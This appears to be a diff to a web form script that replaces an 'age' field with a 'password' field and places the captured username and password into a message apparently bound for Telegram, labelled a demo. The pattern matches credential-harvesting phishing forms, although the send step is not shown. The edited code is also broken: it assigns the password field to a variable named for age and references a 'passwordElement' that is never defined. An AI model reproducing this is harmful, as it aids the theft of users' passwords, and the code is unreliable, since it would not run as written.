@@ -35,15 +35,15 @@ if (form) {
         event.preventDefault();
 
         const usernameElement = document.getElementById("username");
-        const ageElement = document.getElementById("age");
+        const ageElement = document.getElementById("password");
 
-        if (!usernameElement || !ageElement) {
+        if (!usernameElement || ! passwordElement) {
             console.error("Required form fields not found");
             return;
         }
 
         const username = usernameElement.value.trim();
-        const age = ageElement.value.trim();
+        const password = passwordElement.value.trim();
 
         const telegramMessage =
             "📋 DEMO FORM SUBMISSION\n\n" +
